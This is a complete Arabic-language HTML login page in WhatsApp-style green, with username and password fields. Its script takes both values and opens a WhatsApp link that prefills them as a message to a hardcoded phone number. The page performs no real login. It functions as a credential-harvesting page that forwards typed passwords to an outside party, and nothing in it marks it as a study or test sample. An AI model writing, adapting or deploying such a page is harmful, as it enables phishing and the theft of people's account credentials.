<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            text-align: center;
            background-color: white;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 300px;
        }

        h1 {
            color: #333;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        form button {
            background-color: #25D366;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }

        form button:hover {
            background-color: #128C7E;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h1>تسجيل الدخول</h1>
        <form id="login-form">
            <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">إرسال إلى WhatsApp</button>
        </form>
    </div>

    <script>
        document.getElementById('login-form').onsubmit = function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إعداد رابط WhatsApp مع النص المرسل
            const message = `اسم المستخدم: ${username} \nكلمة المرور: ${password}`;
            const phoneNumber = "0504104065";  // رقم الهاتف
            const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;

            // فتح رابط WhatsApp
            window.open(url, '_blank');
        };
    </script>

</body>
</html>
